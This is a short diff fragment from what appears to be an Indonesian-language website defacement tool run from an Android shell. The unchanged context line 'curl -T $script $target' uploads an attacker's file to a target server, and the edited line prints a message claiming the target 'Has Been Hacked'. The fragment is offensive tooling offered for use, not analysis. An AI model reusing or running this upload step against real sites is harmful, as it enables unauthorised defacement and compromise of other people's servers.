@@ -79,5 +79,5 @@ echo loading..
 cd /sdcard
 curl -T $script $target
 echo $red
-echo [$target ~ Hacked]
+echo [$target/$script Has Been Hacked]
 echo terimakasih $ta telah menggunakan tools ini 
